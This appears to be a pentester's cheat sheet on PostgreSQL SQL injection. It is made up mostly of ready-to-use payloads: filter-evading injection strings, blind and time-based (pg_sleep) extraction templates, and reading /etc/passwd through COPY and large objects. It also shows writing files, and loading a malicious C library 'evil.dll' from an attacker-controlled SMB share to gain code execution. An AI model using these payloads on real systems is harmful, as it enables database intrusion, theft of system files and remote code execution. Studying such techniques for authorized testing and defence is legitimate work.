# SQL injections

`AAAA')/**/or/**/(select/**/1)=**0**%23`

`AAAA')/**/or/**/(select/**/1)=**1**%23`

**ASCII Ranges \(for blind sqli\)**

```text
lowercase_range = [x for x in range(97, 123)]
uppercase_range = [x for x in range(65, 91)]
digits_range = [x for x in range(48, 58)]
specialchars_range = [x for x in range(32, 48)]
specialchars_range += [x for x in range(58, 65)]
specialchars_range += [x for x in range(91, 97)]
specialchars_range += [x for x in range(123, 127)]
```

**Quotes bypass**

```text
1. get your ascii code
ascii(«‘»);
2. and convert it to the char:
chr(45) (for example)

Another way
COPY table(column) TO $$/tmp/poc.txt$$
```

**POSTGRES:**

`select current_setting(‘is_superuser’);`

**How to manipulate with sleep\(\)**

```text
select case
when (
select current_setting($$is_superuser$$)
)=$$on$$
then
pg_sleep(5)
end;
```

**OR oneliner**

`test AND (select case when (select ascii(substring((%s),%d,1))=[CHAR]) then pg_sleep(%d) end);`

**How to create a table with file content**

```text
CREATE TEMP TABLE read_file (content text);
COPY read_file FROM $$/etc/passwd$$
SELECT * FROM read_file;
```

You can rewrite some scripts on FS

**DLL extension in postgres**

**How to create a function**

```text
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS **'FILENAME',** 'test' LANGUAGE 'C' STRICT;

sudo impacket-smbserver name /tmp/folder

CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS VOID AS $$\\\\192.168.1.100\\name\\evil.dll$$, $$evil$$ LANGUAGE C STRICT;
SELECT remote_test();
```

**Large Objects \(admin user\)**

```text
// pg_largeobject has id and pageno
// each page contains 2kb of bytea format (raw bytes)

SELECT lo_import($$/etc/passwd$$, 1337);
SELECT lo_export(1337, $$c:\\\\new_win.ini$$);
SELECT loid, pageno, encode(data, $$escape$$) FROM pg_largeobject;
UPDATE pg_largeobject SET data=decode('77303074', 'hex') WHERE loid=1337 AND pageno=0;

//lo_list (list all large objects with their id)
//lo_unlink 1337 (delete object)
```

**Blind SQL Injection automation**

[https://github.com/httpnotonly/violent-python/blob/master/blind-sqli-post.py](https://github.com/httpnotonly/violent-python/blob/master/blind-sqli-post.py)

